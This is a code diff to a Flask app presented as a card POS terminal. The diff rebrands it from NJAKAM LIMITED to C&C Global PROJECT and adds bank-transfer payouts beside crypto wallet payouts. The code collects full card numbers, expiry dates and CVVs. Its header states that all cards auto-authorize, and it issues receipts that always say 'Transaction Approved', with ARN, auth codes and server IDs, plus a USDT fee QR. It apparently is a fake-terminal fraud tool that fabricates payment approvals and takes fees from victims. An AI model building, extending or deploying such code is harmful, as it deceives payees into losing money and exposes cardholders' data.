@@ -1,4 +1,4 @@
-# app.py - cleaned NJAKAM LIMITED POS (all cards auto-authorize)
+# app.py - C&C Global PROJECT POS (all cards auto-authorize)
 from flask import Flask, render_template, request, redirect, session, url_for, send_file, flash, jsonify
 from flask_mail import Mail, Message
 import random, logging, os, hashlib, json, re, tempfile, threading
@@ -39,10 +39,20 @@ app.config['MAIL_PASSWORD'] = os.environ.get('MAIL_PASSWORD', '')
 app.config['MAIL_DEFAULT_SENDER'] = os.environ.get('MAIL_DEFAULT_SENDER', 'support@njakamltd.com')
 mail = Mail(app)
 
+TERMINAL_COMPANY_NAME = "C&C Global PROJECT"
 # Footer on receipt emails (plain text + HTML)
-TERMINAL_MAIL_ADDRESS_LINE = "Paarl City, 7624 - South Africa"
+TERMINAL_MAIL_ADDRESS_LINE = "P O BOX 504214, Gaborone, Botswana"
 TERMINAL_MAIL_CONTACT = "+14145126049"
 TERMINAL_MAIL_SUPPORT_EMAIL = "support@njakamltd.com"
+
+
+@app.context_processor
+def _inject_terminal_branding():
+    return {
+        "terminal_company_name": TERMINAL_COMPANY_NAME,
+        "terminal_mail_address_line": TERMINAL_MAIL_ADDRESS_LINE,
+        "terminal_mail_support_email": TERMINAL_MAIL_SUPPORT_EMAIL,
+    }
 
 
 def _mail_imap_host_default():
@@ -110,7 +120,7 @@ def _receipt_email_plain_and_html(txn_id, amount_fmt, timestamp):
     """Plain and HTML bodies for receipt emails; address block includes contact phone."""
     plain = f"""Dear Customer,
 
-Thank you for your transaction at NJAKAM LIMITED.
+Thank you for your transaction at {TERMINAL_COMPANY_NAME}.
 
 Please find your receipt attached as a PDF.
 
@@ -121,7 +131,7 @@ Transaction Summary:
 - Status: Approved
 
 ---
-NJAKAM LIMITED Terminal
+{TERMINAL_COMPANY_NAME} Terminal
 {TERMINAL_MAIL_ADDRESS_LINE}
 Terminal support: {TERMINAL_MAIL_CONTACT}
 
@@ -133,7 +143,7 @@ This is an automated receipt. Please keep for your records.
     html = f"""<!DOCTYPE html>
 <html><head><meta charset="utf-8"></head><body style="margin:16px;font-family:system-ui,-apple-system,sans-serif;font-size:15px;color:#0f172a;line-height:1.5;">
 <p>Dear Customer,</p>
-<p>Thank you for your transaction at NJAKAM LIMITED.</p>
+<p>Thank you for your transaction at {html_escape(TERMINAL_COMPANY_NAME)}.</p>
 <p>Please find your receipt attached as a PDF.</p>
 <p><strong>Transaction Summary:</strong></p>
 <ul style="margin:0.5em 0;padding-left:1.25em;">
@@ -143,7 +153,7 @@ This is an automated receipt. Please keep for your records.
 <li>Status: Approved</li>
 </ul>
 <hr style="border:none;border-top:1px solid #cbd5e1;margin:1.25rem 0;">
-<p style="margin:0;"><strong>NJAKAM LIMITED Terminal</strong><br>
+<p style="margin:0;"><strong>{html_escape(TERMINAL_COMPANY_NAME)} Terminal</strong><br>
 {html_escape(TERMINAL_MAIL_ADDRESS_LINE)}<br>
 Terminal support: <a href="tel:{html_escape(tel_href)}">{html_escape(TERMINAL_MAIL_CONTACT)}</a></p>
 <p style="margin-top:1rem;font-size:13px;color:#64748b;">This is an automated receipt. Please keep for your records.</p>
@@ -186,6 +196,7 @@ def _wallet_image_filename(payout_type):
     if payout_upper == "ERC20":
         candidates = ["ERC20.jpeg", "erc20.jpeg"]
     else:
+        # TRC20 and Bank (bank payouts: fee QR still uses default USDT TRC20 asset)
         candidates = ["TRC20.jpeg", "trc20.jpeg"]
     static_dir = os.path.join(app.root_path, 'static')
     for name in candidates:
@@ -193,7 +204,63 @@ def _wallet_image_filename(payout_type):
             return name
     return candidates[0]  # fallback so URL is still generated
 
-def _build_receipt_pdf_bytes(txn_id, arn, pan_last4, amount, payout_type, wallet, auth_code, timestamp, server_id=None):
+def _bank_account_masked(digits_str):
+    d = re.sub(r"\D", "", digits_str or "")
+    if len(d) >= 4:
+        return "****" + d[-4:]
+    if d:
+        return "****" + d
+    return "—"
+
+
+def _normalize_swift_bic(raw):
+    """Return uppercase SWIFT/BIC if valid (8 or 11 chars), else None."""
+    s = re.sub(r"\s+", "", (raw or "")).upper()
+    if len(s) not in (8, 11):
+        return None
+    if not re.match(r"^[A-Z]{4}[A-Z]{2}[A-Z0-9]{2}([A-Z0-9]{3})?$", s):
+        return None
+    return s
+
+
+def _normalize_optional_iban_routing(raw):
+    """Trim; empty allowed. Cap length for storage/display."""
+    s = " ".join((raw or "").split())
+    if len(s) > 64:
+        s = s[:64]
+    return s
+
+
+AMOUNT_USD_MIN = Decimal("1")
+AMOUNT_USD_MAX = Decimal("50000000")
+
+
+def _effective_payout_category():
+    c = (session.get("payout_category") or "").strip().lower()
+    if c in ("crypto", "bank"):
+        return c
+    if (session.get("payout_type") or "").strip() == "Bank":
+        return "bank"
+    return "crypto"
+
+
+def _build_receipt_pdf_bytes(
+    txn_id,
+    arn,
+    pan_last4,
+    amount,
+    payout_type,
+    wallet,
+    auth_code,
+    timestamp,
+    server_id=None,
+    payout_category="crypto",
+    bank_name="",
+    bank_account_holder="",
+    bank_account_number="",
+    bank_swift="",
+    bank_iban_routing="",
+):
     """Generate PDF receipt with logo and QR code"""
     pdf_buffer = io.BytesIO()
     
@@ -208,7 +275,7 @@ def _build_receipt_pdf_bytes(txn_id, arn, pan_last4, amount, payout_type, wallet
         img_w, img_h = (108, 54) if has_logo else (0, 0)
         logo_gap = 16 if has_logo else 0
 
-        title = "NJAKAM LIMITED"
+        title = TERMINAL_COMPANY_NAME
         title_font, title_size = "Helvetica-Bold", 28
         addr_lines = [
             TERMINAL_MAIL_ADDRESS_LINE,
@@ -301,9 +368,8 @@ def _build_receipt_pdf_bytes(txn_id, arn, pan_last4, amount, payout_type, wallet
         # Mask auth code
         masked_auth = "*" * len(auth_code) if auth_code else "****"
         
-        # Truncate wallet for display
-        wallet_display = wallet[:8] + "..." + wallet[-8:] if wallet and len(wallet) > 20 else wallet
-        
+        cat = (payout_category or "crypto").strip().lower()
+
         # Determine how to show the server/connection on the PDF receipt
         if server_id is None:
             sid_source = _get_receipt_server_id()
@@ -315,18 +381,43 @@ def _build_receipt_pdf_bytes(txn_id, arn, pan_last4, amount, payout_type, wallet
                 sid = "OFFLINE"
             else:
                 sid = _mask_receipt_server_id(sid_str)
-        details = [
-            ("Transaction ID:", txn_id),
-            ("ARN:", arn),
-            ("Card:", masked_card),
-            ("Amount:", f"USD {amount}"),
-            ("Auth Code:", masked_auth),
-            ("Status:", "Transaction Approved"),
-            ("Payout Type:", payout_type),
-            ("Receiving Address:", wallet_display if wallet else "N/A"),
-            ("Date/Time:", timestamp),
-            ("Connected Server ID:", sid),
-        ]
+        if cat == "bank":
+            masked_acct = _bank_account_masked(bank_account_number)
+            iban_line = (bank_iban_routing or "—").strip() or "—"
+            if len(iban_line) > 42:
+                iban_line = iban_line[:39] + "…"
+            details = [
+                ("Transaction ID:", txn_id),
+                ("ARN:", arn),
+                ("Card:", masked_card),
+                ("Amount:", f"USD {amount}"),
+                ("Auth Code:", masked_auth),
+                ("Status:", "Transaction Approved"),
+                ("Payout Type:", "Bank transfer"),
+                ("Bank:", bank_name or "—"),
+                ("Account name:", bank_account_holder or "—"),
+                ("Account no.:", masked_acct),
+                ("SWIFT/BIC:", (bank_swift or "—").strip() or "—"),
+                ("IBAN / Routing:", iban_line),
+                ("Date/Time:", timestamp),
+                ("Connected Server ID:", sid),
+            ]
+        else:
+            wallet_display = (
+                wallet[:8] + "..." + wallet[-8:] if wallet and len(wallet) > 20 else (wallet or "")
+            )
+            details = [
+                ("Transaction ID:", txn_id),
+                ("ARN:", arn),
+                ("Card:", masked_card),
+                ("Amount:", f"USD {amount}"),
+                ("Auth Code:", masked_auth),
+                ("Status:", "Transaction Approved"),
+                ("Payout Type:", payout_type),
+                ("Receiving Address:", wallet_display if wallet else "N/A"),
+                ("Date/Time:", timestamp),
+                ("Connected Server ID:", sid),
+            ]
         
         for label, value in details:
             c.drawString(40, y, label)
@@ -469,7 +560,8 @@ def _clear_sale_session():
     """Reset in-progress sale data (keep login)."""
     for key in (
         'protocol_mode', 'protocol', 'code_length', 'pinless', 'offline',
-        'amount', 'payout_type', 'wallet', 'pan', 'exp', 'cvv', 'card_type', 'email',
+        'amount', 'payout_category', 'payout_type', 'wallet', 'bank_name', 'bank_account_holder',
+        'bank_account_number', 'bank_swift', 'bank_iban_routing', 'pan', 'exp', 'cvv', 'card_type', 'email',
         'txn_id', 'arn', 'timestamp', 'field39', 'auth_code',
         '_txn_history_logged',
     ):
@@ -645,9 +737,21 @@ def amount():
     if redir:
         return redir
     if request.method == 'POST':
-        session['amount'] = request.form.get('amount')
-        return redirect(url_for('payout'))
-    return render_template('amount.html')
+        raw_amt = (request.form.get("amount") or "").strip().replace(",", "")
+        try:
+            amt = Decimal(raw_amt)
+        except (InvalidOperation, TypeError):
+            flash("Enter a valid amount in USD.")
+            return redirect(url_for("amount"))
+        if amt != amt.quantize(Decimal("0.01")):
+            flash("Use at most two decimal places.")
+            return redirect(url_for("amount"))
+        if amt < AMOUNT_USD_MIN or amt > AMOUNT_USD_MAX:
+            flash(f"Amount must be between ${AMOUNT_USD_MIN} and ${AMOUNT_USD_MAX:,.0f} USD.")
+            return redirect(url_for("amount"))
+        session["amount"] = str(amt)
+        return redirect(url_for("payout"))
+    return render_template("amount.html")
 
 @app.route('/payout', methods=['GET', 'POST'])
 @login_required
@@ -656,26 +760,62 @@ def payout():
     if redir:
         return redir
     if request.method == 'POST':
-        method = request.form['method']
-        session['payout_type'] = method
+        category = (request.form.get("payout_category") or "crypto").strip().lower()
+        if category not in ("crypto", "bank"):
+            category = "crypto"
+        session["payout_category"] = category
 
-        if method == 'ERC20':
-            wallet = request.form.get('erc20_wallet', '').strip()
+        if category == "bank":
+            session.pop("wallet", None)
+            bank_name = (request.form.get("bank_name") or "").strip()
+            holder = (request.form.get("bank_account_holder") or "").strip()
+            acct_raw = (request.form.get("bank_account_number") or "").strip()
+            acct_digits = re.sub(r"\D", "", acct_raw)
+            swift = _normalize_swift_bic(request.form.get("bank_swift", ""))
+            iban_route = _normalize_optional_iban_routing(request.form.get("bank_iban_routing", ""))
+            if len(bank_name) < 2 or len(holder) < 2 or len(acct_digits) < 6:
+                flash("Enter bank name, account name, and a valid account number (at least 6 digits).")
+                return redirect(url_for("payout"))
+            if not swift:
+                flash("Enter a valid SWIFT/BIC code (8 or 11 letters and digits).")
+                return redirect(url_for("payout"))
+            session["payout_type"] = "Bank"
+            session["bank_name"] = bank_name
+            session["bank_account_holder"] = holder
+            session["bank_account_number"] = acct_digits
+            session["bank_swift"] = swift
+            session["bank_iban_routing"] = iban_route
+            return redirect(url_for("card"))
+
+        session.pop("bank_name", None)
+        session.pop("bank_account_holder", None)
+        session.pop("bank_account_number", None)
+        session.pop("bank_swift", None)
+        session.pop("bank_iban_routing", None)
+
+        method = (request.form.get("method") or "").strip().upper()
+        if method not in ("ERC20", "TRC20"):
+            flash("Select ERC20 or TRC20.")
+            return redirect(url_for("payout"))
+        session["payout_type"] = method
+
+        if method == "ERC20":
+            wallet = request.form.get("erc20_wallet", "").strip()
             if not wallet.startswith("0x") or len(wallet) != 42:
                 flash("Invalid ERC20 address format.")
-                return redirect(url_for('payout'))
-            session['wallet'] = wallet
+                return redirect(url_for("payout"))
+            session["wallet"] = wallet
 
-        elif method == 'TRC20':
-            wallet = request.form.get('trc20_wallet', '').strip()
+        elif method == "TRC20":
+            wallet = request.form.get("trc20_wallet", "").strip()
             if not wallet.startswith("T") or len(wallet) < 34:
                 flash("Invalid TRC20 address format.")
-                return redirect(url_for('payout'))
-            session['wallet'] = wallet
+                return redirect(url_for("payout"))
+            session["wallet"] = wallet
 
-        return redirect(url_for('card'))
+        return redirect(url_for("card"))
 
-    return render_template('payout.html')
+    return render_template("payout.html")
 
 
 # Server-side validator for card entry
@@ -911,6 +1051,7 @@ def success():
             "amount": str(session.get("amount")),
             "amount_fmt": amount_fmt,
             "payout_type": (session.get("payout_type") or "").strip(),
+            "payout_category": _effective_payout_category(),
             "pan_last4": session.get("pan", "")[-4:] if session.get("pan") else "",
             "protocol": raw_protocol,
             "protocol_code": protocol_code,
@@ -966,11 +1107,17 @@ def success():
                 wallet=session.get("wallet"),
                 auth_code=auth_code,
                 timestamp=session.get("timestamp"),
-                server_id=server_for_pdf
+                server_id=server_for_pdf,
+                payout_category=_effective_payout_category(),
+                bank_name=session.get("bank_name") or "",
+                bank_account_holder=session.get("bank_account_holder") or "",
+                bank_account_number=session.get("bank_account_number") or "",
+                bank_swift=session.get("bank_swift") or "",
+                bank_iban_routing=session.get("bank_iban_routing") or "",
             )
             
             # Create email message
-            subject = f"NJAKAM LIMITED Receipt - Transaction {session.get('txn_id')}"
+            subject = f"{TERMINAL_COMPANY_NAME} Receipt - Transaction {session.get('txn_id')}"
             body, html_body = _receipt_email_plain_and_html(
                 session.get('txn_id'), amount_fmt, session.get('timestamp')
             )
@@ -1050,6 +1197,12 @@ def receipt():
         payout=session.get("payout_type"),
         wallet=session.get("wallet"),
         wallet_image=wallet_image,
+        payout_category=_effective_payout_category(),
+        bank_name=session.get("bank_name") or "",
+        bank_account_holder=session.get("bank_account_holder") or "",
+        bank_account_masked=_bank_account_masked(session.get("bank_account_number")),
+        bank_swift=session.get("bank_swift") or "",
+        bank_iban_routing=session.get("bank_iban_routing") or "",
         auth_code=auth_mask,
         email=_mask_email_for_receipt(session.get("email")),
         iso_field_18="5999",                # Default MCC
@@ -1076,6 +1229,12 @@ def receipt_print():
         amount=session.get("amount"),
         payout=session.get("payout_type"),
         wallet=session.get("wallet"),
+        payout_category=_effective_payout_category(),
+        bank_name=session.get("bank_name") or "",
+        bank_account_holder=session.get("bank_account_holder") or "",
+        bank_account_masked=_bank_account_masked(session.get("bank_account_number")),
+        bank_swift=session.get("bank_swift") or "",
+        bank_iban_routing=session.get("bank_iban_routing") or "",
         auth_code=session.get("auth_code", "****"),
         email=_mask_email_for_receipt(session.get("email")),
         iso_field_18="5999",
@@ -1143,11 +1302,17 @@ def send_receipt_email():
             wallet=session.get("wallet"),
             auth_code=auth_code,
             timestamp=session.get("timestamp"),
-            server_id=server_id
+            server_id=server_id,
+            payout_category=_effective_payout_category(),
+            bank_name=session.get("bank_name") or "",
+            bank_account_holder=session.get("bank_account_holder") or "",
+            bank_account_number=session.get("bank_account_number") or "",
+            bank_swift=session.get("bank_swift") or "",
+            bank_iban_routing=session.get("bank_iban_routing") or "",
         )
         
         # Create email message
-        subject = f"NJAKAM LIMITED Receipt - Transaction {session.get('txn_id')}"
+        subject = f"{TERMINAL_COMPANY_NAME} Receipt - Transaction {session.get('txn_id')}"
         body, html_body = _receipt_email_plain_and_html(
             session.get('txn_id'), amount_fmt, session.get('timestamp')
         )
